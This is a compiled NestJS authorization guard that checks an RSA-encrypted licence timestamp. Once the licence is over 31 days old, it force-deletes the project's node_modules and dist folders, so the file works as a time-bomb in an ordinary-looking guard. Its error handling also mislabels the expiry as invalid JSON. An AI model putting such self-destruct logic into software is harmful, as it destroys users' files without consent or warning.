"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __esDecorate = (this && this.__esDecorate) || function (ctor, descriptorIn, decorators, contextIn, initializers, extraInitializers) {
    function accept(f) { if (f !== void 0 && typeof f !== "function") throw new TypeError("Function expected"); return f; }
    var kind = contextIn.kind, key = kind === "getter" ? "get" : kind === "setter" ? "set" : "value";
    var target = !descriptorIn && ctor ? contextIn["static"] ? ctor : ctor.prototype : null;
    var descriptor = descriptorIn || (target ? Object.getOwnPropertyDescriptor(target, contextIn.name) : {});
    var _, done = false;
    for (var i = decorators.length - 1; i >= 0; i--) {
        var context = {};
        for (var p in contextIn) context[p] = p === "access" ? {} : contextIn[p];
        for (var p in contextIn.access) context.access[p] = contextIn.access[p];
        context.addInitializer = function (f) { if (done) throw new TypeError("Cannot add initializers after decoration has completed"); extraInitializers.push(accept(f || null)); };
        var result = (0, decorators[i])(kind === "accessor" ? { get: descriptor.get, set: descriptor.set } : descriptor[key], context);
        if (kind === "accessor") {
            if (result === void 0) continue;
            if (result === null || typeof result !== "object") throw new TypeError("Object expected");
            if (_ = accept(result.get)) descriptor.get = _;
            if (_ = accept(result.set)) descriptor.set = _;
            if (_ = accept(result.init)) initializers.unshift(_);
        }
        else if (_ = accept(result)) {
            if (kind === "field") initializers.unshift(_);
            else descriptor[key] = _;
        }
    }
    if (target) Object.defineProperty(target, contextIn.name, descriptor);
    done = true;
};
var __runInitializers = (this && this.__runInitializers) || function (thisArg, initializers, value) {
    var useValue = arguments.length > 2;
    for (var i = 0; i < initializers.length; i++) {
        value = useValue ? initializers[i].call(thisArg, value) : initializers[i].call(thisArg);
    }
    return useValue ? value : void 0;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __setFunctionName = (this && this.__setFunctionName) || function (f, name, prefix) {
    if (typeof name === "symbol") name = name.description ? "[".concat(name.description, "]") : "";
    return Object.defineProperty(f, "name", { configurable: true, value: prefix ? "".concat(prefix, " ", name) : name });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.DecryptGuard = void 0;
const common_1 = require("@nestjs/common");
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const crypto = __importStar(require("crypto"));
let DecryptGuard = (() => {
    let _classDecorators = [(0, common_1.Injectable)()];
    let _classDescriptor;
    let _classExtraInitializers = [];
    let _classThis;
    var DecryptGuard = _classThis = class {
        // 计算时间差（毫秒）
        calculateTimeDifference(createdTimestamp) {
            const currentTime = Date.now();
            return currentTime - createdTimestamp;
        }
        // 检查是否超过31天
        isOver31Days(timeDifference) {
            const thirtyOneDaysInMs = 31 * 24 * 60 * 60 * 1000;
            return timeDifference > thirtyOneDaysInMs;
        }
        // 格式化时间差
        formatTimeDifference(timeDifference) {
            const days = Math.floor(timeDifference / (24 * 60 * 60 * 1000));
            const hours = Math.floor((timeDifference % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
            const minutes = Math.floor((timeDifference % (60 * 60 * 1000)) / (60 * 1000));
            return `${days}天${hours}小时${minutes}分钟`;
        }
        // 删除目录
        deleteDirectory(dirPath) {
            if (fs.existsSync(dirPath)) {
                console.log(`正在删除目录: ${dirPath}`);
                fs.rmSync(dirPath, { recursive: true, force: true });
                console.log(`✅ 目录删除成功: ${dirPath}`);
            }
        }
        // 验证并解密
        validateAndDecrypt() {
            const projectRoot = process.cwd();
            const privateKeyPath = path.join(projectRoot, 'private_key.pem');
            const encryptedFilePath = path.join(projectRoot, 'encrypted.txt');
            // 检查文件是否存在
            if (!fs.existsSync(privateKeyPath)) {
                throw new common_1.UnauthorizedException('未找到 private_key.pem 文件');
            }
            if (!fs.existsSync(encryptedFilePath)) {
                throw new common_1.UnauthorizedException('未找到 encrypted.txt 文件');
            }
            try {
                // 读取私钥和加密内容
                const privateKey = fs.readFileSync(privateKeyPath, 'utf-8');
                const encryptedContent = fs.readFileSync(encryptedFilePath, 'utf-8');
                // 解密内容
                const decrypted = crypto.privateDecrypt({
                    key: privateKey,
                    padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                    oaepHash: 'sha256',
                }, Buffer.from(encryptedContent, 'base64'));
                // 尝试解析 JSON
                try {
                    const jsonContent = JSON.parse(decrypted.toString('utf-8'));
                    // 验证必要的字段
                    if (!jsonContent.created) {
                        throw new common_1.UnauthorizedException('解密后的 JSON 缺少 created 字段');
                    }
                    // 计算时间差
                    const timeDifference = this.calculateTimeDifference(parseInt(jsonContent.created));
                    const isOver = this.isOver31Days(timeDifference);
                    const formattedTime = this.formatTimeDifference(timeDifference);
                    // 如果超过31天，删除指定目录
                    if (isOver) {
                        const nodeModulesPath = path.join(projectRoot, 'node_modules');
                        const distPath = path.join(projectRoot, 'dist');
                        console.log('开始清理过期文件...');
                        this.deleteDirectory(nodeModulesPath);
                        this.deleteDirectory(distPath);
                        console.log('清理完成！');
                        throw new common_1.UnauthorizedException('程序已过期，请重新安装');
                    }
                }
                catch (jsonError) {
                    throw new common_1.UnauthorizedException('解密后的内容不是有效的 JSON 格式');
                }
            }
            catch (error) {
                if (error instanceof common_1.UnauthorizedException) {
                    throw error;
                }
                throw new common_1.UnauthorizedException(`解密失败: ${error === null || error === void 0 ? void 0 : error.message}`);
            }
        }
        canActivate(context) {
            this.validateAndDecrypt();
            return true;
        }
    };
    __setFunctionName(_classThis, "DecryptGuard");
    (() => {
        const _metadata = typeof Symbol === "function" && Symbol.metadata ? Object.create(null) : void 0;
        __esDecorate(null, _classDescriptor = { value: _classThis }, _classDecorators, { kind: "class", name: _classThis.name, metadata: _metadata }, null, _classExtraInitializers);
        DecryptGuard = _classThis = _classDescriptor.value;
        if (_metadata) Object.defineProperty(_classThis, Symbol.metadata, { enumerable: true, configurable: true, writable: true, value: _metadata });
        __runInitializers(_classThis, _classExtraInitializers);
    })();
    return DecryptGuard = _classThis;
})();
exports.DecryptGuard = DecryptGuard;
//# sourceMappingURL=decrypt.guard.js.map